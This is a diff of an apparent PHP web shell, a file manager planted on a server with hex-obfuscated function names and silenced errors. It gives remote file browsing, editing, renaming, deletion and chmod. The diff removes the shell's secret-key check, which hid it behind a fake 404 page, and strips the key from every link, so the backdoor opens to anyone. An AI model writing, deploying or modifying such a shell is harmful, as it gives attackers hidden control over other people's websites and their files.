@@ -7,12 +7,6 @@
 error_reporting(0);
 @ini_set('display_errors', 0);
 
-$k = 'c0r';
-if (!isset($_GET['key']) || $_GET['key'] !== $k) {
-    header('HTTP/1.1 404 Not Found');
-    exit;
-}
-
 $sd = "\x73\x63\x61\x6e\x64\x69\x72";
 $fg = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
 $fp = "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
@@ -101,7 +95,7 @@ if (isset($_GET['del'])) {
     } else {
         @unlink($target);
     }
-    header("Location: ?key=$k&path=$path");
+    header("Location: ?path=$path");
     exit;
 }
 
@@ -302,18 +296,18 @@ if (isset($_POST['s'])) {
     echo "</div>";
 
     echo "<div class='bread'>";
-    echo "<a href='?key=$k&path=$self_dir' class='home-btn'>HOME</a>";
+    echo "<a href='?path=$self_dir' class='home-btn'>HOME</a>";
     echo "<b>PATH:</b> ";
     $parts = explode(DIRECTORY_SEPARATOR, $path);
     $accum = "";
     foreach ($parts as $p) {
         if ($p === "" && DIRECTORY_SEPARATOR === '/') {
-            echo "<a href='?key=$k&path=/'>/</a>";
+            echo "<a href='?path=/'>/</a>";
             continue;
         }
         if ($p === "") continue;
         $accum .= DIRECTORY_SEPARATOR . $p;
-        echo "<a href='?key=$k&path=$accum'>$p</a> / ";
+        echo "<a href='?path=$accum'>$p</a> / ";
     }
     echo "</div>";
 
@@ -373,15 +367,15 @@ if (isset($_POST['s'])) {
         $prm = substr(sprintf('%o', @fileperms($full)), -4);
         echo "<tr>";
 
-        $jsRename = "javascript:p=prompt('Rename To:', '$i'); if(p) location.href='?key=$k&path=$path&oldname=$i&newname='+p;";
+        $jsRename = "javascript:p=prompt('Rename To:', '$i'); if(p) location.href='?path=$path&oldname=$i&newname='+p;";
 
         if (@is_dir($full)) {
-            echo "<td style='padding:5px;'><a href='?key=$k&path=$full' class='folder-link'>$i</a></td><td>DIR</td><td><span style='color:" . (is_writable($full) ? "#0f0" : "#f00") . ";'>$prm</span></td>
-        <td><a href='?key=$k&path=$full'>OPEN</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?key=$k&path=$path&del=$i' onclick='return confirm(\"Hapus Folder?\")'>DEL</a></td>";
+            echo "<td style='padding:5px;'><a href='?path=$full' class='folder-link'>$i</a></td><td>DIR</td><td><span style='color:" . (is_writable($full) ? "#0f0" : "#f00") . ";'>$prm</span></td>
+        <td><a href='?path=$full'>OPEN</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?path=$path&del=$i' onclick='return confirm(\"Hapus Folder?\")'>DEL</a></td>";
         } else {
             $sz = round(@filesize($full) / 1024, 2) . " KB";
             echo "<td style='padding:5px;'>$i</td><td>$sz</td><td><span style='color:" . (is_writable($full) ? "#0f0" : "#f00") . ";'>$prm</span></td>
-        <td><a href='?key=$k&path=$path&edit=$i'>EDIT</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?key=$k&path=$path&del=$i' onclick='return confirm(\"Hapus File?\")'>DEL</a> | <a href='javascript:void(0)' onclick='p=prompt(\"Chmod:\",\"$prm\");if(p)location.href=\"?key=$k&path=$path&file=$i&chmod=\"+p'>CHMOD</a></td>";
+        <td><a href='?path=$path&edit=$i'>EDIT</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?path=$path&del=$i' onclick='return confirm(\"Hapus File?\")'>DEL</a> | <a href='javascript:void(0)' onclick='p=prompt(\"Chmod:\",\"$prm\");if(p)location.href=\"?path=$path&file=$i&chmod=\"+p'>CHMOD</a></td>";
         }
         echo "</tr>";
     }
